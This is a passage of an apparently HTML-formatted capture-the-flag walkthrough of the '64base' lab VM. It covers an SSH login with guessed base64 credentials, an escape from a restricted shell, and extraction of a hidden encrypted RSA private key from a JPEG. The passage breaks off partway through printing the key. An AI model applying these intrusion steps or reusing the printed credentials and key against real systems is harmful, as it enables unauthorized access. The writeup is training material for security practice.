+|   2048 2a:57:2c:75:8c:34:9f:28:84:15:07:2a:be:d0:41:98 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 97:94:13:38:92:70:6c:3a:c0:4f:f3:f3:e7:ce:40:91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Wow, we have another SSH, at port &lt;b&gt;62964&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nc -nv 192.168.56.102 22
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.102] 22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ssh&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; open
+The programs included with the Fedora GNU/Linux system are free software;
+the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
+individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.
+
+Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001
+
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hmmm, these credentials seem a little bit odd. Let's try the second one, where as login:password pair we can use decrypted content of previous flag - 64base:64base5h377. Unfortunately, these don't seem to work. &lt;/p&gt;
+
+&lt;p&gt;After a while, I came with idea of encrypting the password using base64, and feeling to do this was right! This credentials have worked. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;64base5h377 | base64
+NjRiYXNlNWgzNzcK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Than let's log in. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ssh 64base@192.168.56.102 -p 62964
+64base@192.168.56.102&lt;span class=&quot;s1&quot;&gt;'s password:
+
+Last login: Sat Feb 11 18:25:53 2017 from 192.168.56.101
+64base@64base:~$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, we're in. But what now? None of the commands seems to work. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:~$ &lt;/span&gt;ls -la
+well_done_:D
+&lt;span class=&quot;gp&quot;&gt;64base@64base:~$ &lt;/span&gt;cat well_done_:D
+ _           
+ &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;                                                       
+  &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;_          _.-._                
+   X:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         
+   &lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;          
+    &lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;      &lt;span class=&quot;se&quot;&gt;\=&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /          
+   /X:::&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;  .-./&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'\.--.       
+   \\/\::\ / /     (    l      
+    ~\ \::\ /      `.   L.      
+      \/:::|         `.'&lt;/span&gt;  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;     
+      /:/&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;|         &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;    &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;.    
+      &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'`.          &amp;gt;    )     
+             \       //  .-'&lt;/span&gt;     
+              |     /&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;  .&lt;span class=&quot;s1&quot;&gt;'        
+              `-..-'&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;       
+              __||/  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;-&lt;span class=&quot;s1&quot;&gt;'          
+             / _ \ #  |            
+            |  #  |#  |           
+         LS |  #  |#             
+
+    BioTronics Security Droid
+64base@64base:~$ uname -a
+-rbash: uname: command not found&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After spending lot of time, trying different combinations of commands, I've decided to look in the &lt;b&gt;env&lt;/b&gt; variables. Custom &lt;b&gt;$PATH&lt;/b&gt;? Let's take a look at it. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:~$ &lt;/span&gt;env
+&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm-256color
+&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/rbash
+&lt;span class=&quot;nv&quot;&gt;SSH_CLIENT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.56.101 45436 62964
+&lt;span class=&quot;nv&quot;&gt;SSH_TTY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/pts/0
+&lt;span class=&quot;nv&quot;&gt;USER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;64base
+&lt;span class=&quot;nv&quot;&gt;MAIL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/mail/64base
+&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/alt-bin
+&lt;span class=&quot;nv&quot;&gt;PWD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/64base
+&lt;span class=&quot;nv&quot;&gt;LANG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_GB.UTF-8
+&lt;span class=&quot;nv&quot;&gt;GCC_COLORS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01;31:warning&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01;35:note&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01;36:caret&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01;32:locus&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01:quote&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;01
+&lt;span class=&quot;nv&quot;&gt;SHLVL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+&lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/64base
+&lt;span class=&quot;nv&quot;&gt;LANGUAGE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en_GB:en
+&lt;span class=&quot;nv&quot;&gt;LOGNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;64base
+&lt;span class=&quot;nv&quot;&gt;SSH_CONNECTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.56.101 45436 192.168.56.102 62964
+&lt;span class=&quot;nv&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var/alt-bin/env
+&lt;span class=&quot;gp&quot;&gt;64base@64base:~$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+/var/alt-bin/awk /var/alt-bin/base64 /var/alt-bin/cat /var/alt-bin/dircolors /var/alt-bin/droids /var/alt-bin/egrep /var/alt-bin/env /var/alt-bin/fgrep /var/alt-bin/file /var/alt-bin/find /var/alt-bin/grep /var/alt-bin/head /var/alt-bin/less /var/alt-bin/ls /var/alt-bin/more /var/alt-bin/perl /var/alt-bin/python /var/alt-bin/ruby /var/alt-bin/tail&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, we have the list of all executables that we have access to. But wait can You see it too? What are droids? Let's check that out! &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/64base/matrix.png&quot; alt=&quot;Droids-executable&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Wow, cool effect. But it seems to go in an infinite loop. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/64base/droids.png&quot; alt=&quot;Droids-after&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After closing down, it showed this message. But is that it? Some cryptic clues? Luckily no, somehow we are now able to execute previously restricted commands. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:~$ &lt;/span&gt;uname -a
+Linux 64base 3.16.0-4-586 &lt;span class=&quot;c&quot;&gt;#1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can now find next flag! After some more searching I've found it in &lt;b&gt;/var/www/html/admin/S3cR37&lt;/b&gt; directory.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:/$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www
+&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;admin
+&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin$ &lt;/span&gt;ls -la
+index.php  S3cR37
+&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;S3cR37/
+&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin/S3cR37$ &lt;/span&gt;ls -la
+flag5&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let's decode it. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin/S3cR37$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | base64 -d
+Look Inside! :D&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2&gt;Sixth flag&lt;/h2&gt;
+
+&lt;p&gt;Let's check this file using &lt;b&gt;file&lt;/b&gt; command. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin/S3cR37$ &lt;/span&gt;file flag5&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt;
+flag5&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt;: JPEG image data, JFIF standard 1.01, resolution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, density 72x72, segment length 16, comment: &lt;span class=&quot;s2&quot;&gt;&quot;4c5330744c5331435255644a546942535530456755464a4a566b4655525342&quot;&lt;/span&gt;, baseline, precision 8, 960x720, frames 3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;JPEG image? We can copy it to Kali using &lt;b&gt;scp&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;scp -P 62964 64base@192.168.56.102:/var/www/html/admin/S3cR37/flag5&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt; flag5.jpeg
+64base@192.168.56.102&lt;span class=&quot;s1&quot;&gt;'s password:
+flag5{TG9vayBJbnNpZGUhIDpECg==}               100%  192KB 192.0KB/s   00:00&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/64base/usetheforce.png&quot; alt=&quot;Use-the-force-Luke&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Okay, after all these puzzles, I think &quot;&lt;b&gt;Use the force&lt;/b&gt;&quot; will be somehow essential in finding the next flag. But firstly, let's check this file for some more clues. After using &lt;b&gt;string&lt;/b&gt; command, we can actually see some big chunk of data, looking like hexadecimal string. Let's decode it. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;64base@64base:/var/www/html/admin/S3cR37$ &lt;/span&gt;strings flag5&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TG9vayBJbnNpZGUhIDpECg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt;
+JFIF
+4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0a
+-- Other data omitted --
+
+&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -- Enter this huge chunk of data --  | xxd -r -p
+LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
+Sy1JbmZvOiBBRVMtMTI4LUNCQyw2MjFBMzhBQUQ0RTlGQUEzNjU3Q0EzODg4RDlCMzU2QwoKbUR0
+UnhJd2g0MFJTTkFzMitsTlJIdlM5eWhNK2VheHhVNXlyR1BDa3JiUVcvUmdQUCtSR0pCejlWclRr
+dll3NgpZY091WWVaTWpzNGZJUG43Rlp5Smd4R0hoU3hRb3hWbjlrRGt3bnNNTkRpcnRjb0NPazlS
+REFHNWV4OXg0VE16CjhJbERCUXE1aTlZemo5dlBmemVCRFpkSXo5RHcyZ24yU2FFZ3U1emVsKzZI
+R09iRjhaaDNNSWNoeThzMVhyRTAKa3ZMS0kyNTJteld3NGtiU3M5K1FhV3loMzRrOEpJVnp1YzFR
+Q3liejVXb1U1WTU2RzZxMVJkczBiY1ZxTFVzZQpNU3pLazNtS2FXQXlMWGxvN0xubXFxVUZLSG5k
+QkUxU2hQVlZpNGIwR3lGSUxPT3Z0bXZGYjQremh1NmpPV1lICmsyaGRDSE5TdCtpZ2d5OWhoM2ph
+RWdVblNQWnVFN05Kd0RZYTdlU0RhZ0wxN1hLcGttMllpQlZyVVh4Vk1ub2IKd1hSZjVCY0dLVTk3
+eGRvclYyVHEraDlLU2xaZTc5OXRyVHJGR05lMDV2eERyaWo1VXQyS2NReCs5OEs4S3BXTApndUpQ
+UlBLR2lqbzk2SERHYzNMNVlzeE9iVmcrL2ZqMEF2c0tmcmNWL2x4YVcrSW15bWMxTVhpSk1ibUN6
+bER3ClRBV21hcWtSRkR5QTFIVXZ0dlNlVnFTMS9IamhEdzlkNEtzdnNqa2p2eWVRVHNzZnNkR2NV
+MGhEa1h3Uldzc2QKMmQzRytOam0xUjVaTE5nUmxOcFZHamhLQzRBc2ZYUzNKMHoydDNCUE05Wk9C
+TUJlOUR4OHptNXhGWTl6V3RydgpBR3ByMEJoOEtRd21walFVYzFhZnNxYVFYMFVITkxYVDFaT1dL
+amc0U0EzWEM5ZENFeUZxMFNJeFFqTzlMR0NHCjRRNW5jZlVobXZ0cXl1dENsbDJkWFBzWFZEZTRl
+b0QxQ2t2Sk5EWTNLUFcrR2tOOUwrOUNQeTgrRE51bkZJd3gKK1QrKzdRZy91UFhLcTRNNjFJUTgw
+MzRVaHVSV1M0VHFQOWF6WDNDRzlMeW9pQjZWYktPZUR3TjhhaWxMS1pCcwpmWTlRNkFNMXN5bGl6
+SDFubnhLT3RaUVd1cnhqR0pCSXM2MnRlbE1rYXM5eU5NazNMdTdxUkg2c3dPOXNkVEJpCitqMHg0
+dURaakpjZ01YeGZiMHc1QTY0bFlGc01SekZqN1hkZnkxOStNZThKRWhROEtOWER3UUtEeVVMRk9U
+c3oKMTNWZkJOeFlzeUw1ekdYTnp5cVo0SS9PTzdNZWQyajBHejBnMjFpSEEvMDZtcnMyY2xkczZT
+VUJHRXZuOE5pVgpyU3JINnZFczRTemcweDhkZEd2UTBxVzF2TWtUUnUzT3kvZTEwRjc0NXhETUFU
+S1JsS1o2cllITUN4SjNJY250CkV6ME9NWFlkQzZDaUYvSVd0Z2RVK2hLeXZzNHNGdENCY2xTYWdt
+RFRKMmtaZHU0UlJ3WVZWNm9JTno5YnBPdkUKUngzSFVxZm5LU2hydXpNOVpraUlrdVNmUnRmaU12
+YlR6ZmZKVFM0YzQ4Q081WC9SZUYvQWFNeGtiU2RFT0ZzSQpGdjlYZGk5U2ROdXhHSEUyRzRIdkpk
+SXByRlVyVlNwU0k4MHdncmIyNDVzdzZnVG9pdFo5MGhKNG5KNWF5N0FHCllpYWE1bzc4NzcvZnc2
+WVovMlUzQURkaVNPQm0raGpWMkpWeHJveVVYYkc1ZGZsM204R3ZmNzFKNjJGSHE4dmoKcUphblNr
+ODE3NXowYmpyWFdkTEczRFNsSUppc2xQVyt5RGFmN1lCVll3V1IrVEExa0M2aWVJQTV0VTNwbi9J
+Mwo2NFo1bXBDK3dxZlR4R2dlQ3NnSWs5dlNuMnAvZWV0ZEkzZlFXOFdYRVJiRGV0MVVMSFBxdElp
+N1NaYmo4ditQCmZuSExRdkV3SXMrQmYxQ3BLMUFrWmVVTVJFUWtCaERpNzJIRmJ3MkcvenF0aS9Z
+ZG5xeEF5bDZMWnpJZVFuOHQKL0dqNGthckoxaU05SWYzOWRNNU9hQ1ZaUi9UT0JWYVI4bXJQN1Z0
+&lt;span class=&quot;nv&quot;&gt;Sm9yOWplSDJ0RUwwdG9FcVdCMVBLMHVYUAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This looks like another base64 decryption. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -- Enter this huge chunk of base64 data --  | base64 -d
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C
+
+mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
+YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
+8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
+kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
+MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH
+k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob
+wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL
+guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw
+TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd
+2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv
+AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG
+4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx
++T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs
+fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi
++j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz
+13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV
+rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt
+Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE
+Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI
+Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG
+Yiaa5o7877/fw6YZ/2U3ADdiSOBm+hjV2JVxroyUXbG5dfl3m8Gvf71J62FHq8vj
